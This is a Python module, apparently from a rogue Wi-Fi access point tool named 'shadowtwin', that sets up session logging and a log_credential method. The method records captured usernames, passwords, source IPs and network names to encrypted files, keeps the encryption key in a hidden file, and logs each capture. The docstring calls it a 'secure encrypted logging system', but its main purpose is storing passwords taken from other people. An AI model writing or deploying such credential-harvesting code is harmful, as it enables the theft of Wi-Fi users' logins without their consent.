"""
Secure encrypted logging system
"""

import logging
import os
import json
from datetime import datetime
from cryptography.fernet import Fernet
import hashlib

class SecureLogger:
    def __init__(self, log_dir="logs", encrypt=True):
        self.log_dir = log_dir
        self.encrypt = encrypt
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create log directory
        os.makedirs(log_dir, exist_ok=True)
        os.makedirs(f"{log_dir}/sessions", exist_ok=True)
        os.makedirs(f"{log_dir}/credentials", exist_ok=True)
        
        # Generate encryption key if needed
        if encrypt:
            key_file = f"{log_dir}/.key"
            if os.path.exists(key_file):
                with open(key_file, 'rb') as f:
                    self.key = f.read()
            else:
                self.key = Fernet.generate_key()
                with open(key_file, 'wb') as f:
                    f.write(self.key)
                os.chmod(key_file, 0o600)
            self.cipher = Fernet(self.key)
        
        # Setup logging
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging system"""
        log_file = f"{self.log_dir}/sessions/session_{self.session_id}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger('shadowtwin')
    
    def info(self, message):
        """Log info message"""
        self.logger.info(message)
    
    def warning(self, message):
        """Log warning message"""
        self.logger.warning(message)
    
    def error(self, message):
        """Log error message"""
        self.logger.error(message)
    
    def log_credential(self, username, password, source_ip, ssid):
        """Securely log captured credentials"""
        credential_data = {
            'timestamp': datetime.now().isoformat(),
            'username': username,
            'password': password,
            'source_ip': source_ip,
            'ssid': ssid,
            'session_id': self.session_id
        }
        
        cred_file = f"{self.log_dir}/credentials/creds_{self.session_id}.json"
        
        if self.encrypt:
            encrypted_data = self.cipher.encrypt(
                json.dumps(credential_data).encode()
            )
            with open(cred_file, 'ab') as f:
                f.write(encrypted_data + b'\n')
        else:
            with open(cred_file, 'a') as f:
                json.dump(credential_data, f)
                f.write('\n')
        
        self.logger.info(f"Credential captured - User: {username}, SSID: {ssid}")